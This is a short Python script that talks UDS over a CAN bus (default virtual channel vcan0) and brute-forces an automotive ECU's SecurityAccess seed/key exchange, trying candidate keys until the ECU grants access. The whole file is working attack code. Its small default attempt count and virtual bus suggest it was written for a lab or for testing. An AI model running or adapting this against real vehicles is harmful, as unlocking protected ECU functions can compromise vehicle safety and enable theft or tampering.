import can
import time
import argparse

REQ_ID = 0x7E0
RESP_ID = 0x7E8

SID_DIAGNOSTIC_SESSION_CONTROL = 0x10
SID_SECURITY_ACCESS = 0x27
SESSION_EXTENDED = 0x03
SUB_REQUEST_SEED = 0x01
SUB_SEND_KEY = 0x02


class UDSClient:
    def __init__(self, channel="vcan0"):
        self.bus = can.interface.Bus(channel=channel, interface="socketcan")

    def send(self, data):
        msg = can.Message(arbitration_id=REQ_ID, data=data, is_extended_id=False)
        self.bus.send(msg)

    def recv(self, timeout=2.0):
        msg = self.bus.recv(timeout=timeout)
        return msg.data if msg else None

    def start_extended_session(self):
        self.send([SID_DIAGNOSTIC_SESSION_CONTROL, SESSION_EXTENDED])
        return self.recv()

    def request_seed(self):
        self.send([SID_SECURITY_ACCESS, SUB_REQUEST_SEED])
        resp = self.recv()
        if resp is None or resp[0] != SID_SECURITY_ACCESS + 0x40:
            return None
        return (resp[2] << 8) | resp[3]

    def send_key(self, key):
        data = [SID_SECURITY_ACCESS, SUB_SEND_KEY, key >> 8 & 0xFF, key & 0xFF]
        self.send(data)
        return self.recv()


def brute_force(client, guess_range, delay=0.1):
    client.start_extended_session()

    for guess in guess_range:
        seed = client.request_seed()
        if seed is None:
            print("locked out or no seed, stopping")
            return None

        resp = client.send_key(guess)
        if resp is None:
            continue

        if resp[0] == SID_SECURITY_ACCESS + 0x40:
            print(f"key found: {guess:#06x} for seed {seed:#06x}")
            return guess

        time.sleep(delay)

    print("exhausted guess range, no key found")
    return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--channel", default="vcan0")
    parser.add_argument("--attempts", type=int, default=20)
    parser.add_argument("--delay", type=float, default=0.1)
    args = parser.parse_args()

    client = UDSClient(args.channel)
    brute_force(client, range(0, args.attempts), delay=args.delay)
